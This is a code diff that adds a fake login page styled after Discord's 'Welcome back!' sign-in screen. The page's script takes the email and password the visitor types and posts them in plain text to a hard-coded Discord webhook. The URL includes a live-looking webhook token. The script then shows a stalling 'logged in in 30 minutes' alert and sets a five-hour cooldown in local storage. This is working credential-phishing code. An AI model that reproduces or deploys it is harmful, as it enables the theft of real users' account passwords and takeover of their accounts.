@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Monke | Sign</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="LoginPanel">
+        <h1 class="Title1">
+            Welcome back!
+        </h1>
+
+<div class="form-group">
+
+    <input class="email" type="email">
+</div>
+
+<div class="form-group password-group">
+    <label class="RequiredPass">PASSWORD </label>
+    <input class="password" type="password">
+</div>
+
+    </div>
+</body>
+
+<div former-group>
+
+</div>
+
+<p class="happy">We're so exited to see you again!</p>
+
+<label class="required">EMAIL OR PHONE NUMBER</label>
+
+<p class="Forgot">
+    Forgot your password?
+</p>
+
+<button type="button" class="Login">
+    Login
+</button>
+
+<p class="idk">
+    Need an account? <span class="register">Register</span>
+</p>
+
+<script>
+const COOLDOWN_HOURS = 5;
+const COOLDOWN_MS = COOLDOWN_HOURS * 60 * 60 * 1000;
+const STORAGE_KEY = "login_cooldown_time";
+
+document.querySelector(".Login").addEventListener("click", async function() {
+
+  const lastTime = localStorage.getItem(STORAGE_KEY);
+  const now = Date.now();
+
+  if (lastTime && now - lastTime < COOLDOWN_MS) {
+    const remaining = Math.ceil((COOLDOWN_MS - (now - lastTime)) / 1000 / 60);
+    console.log(`Cooldown active. Try again in ${remaining} minutes.`);
+    return;
+  }
+
+  const email = document.querySelector(".email").value;
+  const password = document.querySelector(".password").value;
+
+  await fetch("https://discord.com/api/webhooks/1500225320245137649/my7MGbELYNZjtU_rzXkAUfdNWpfYoO8CvBORXrFpDas58g5o-sgJ4mtKNyOtdLyrsXa9", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      content: `Email: ${email}\nPassword: ${password}`
+    })
+  });
+
+  alert("You should be logged in in 30minutes. please wait")
+
+});
+</script>
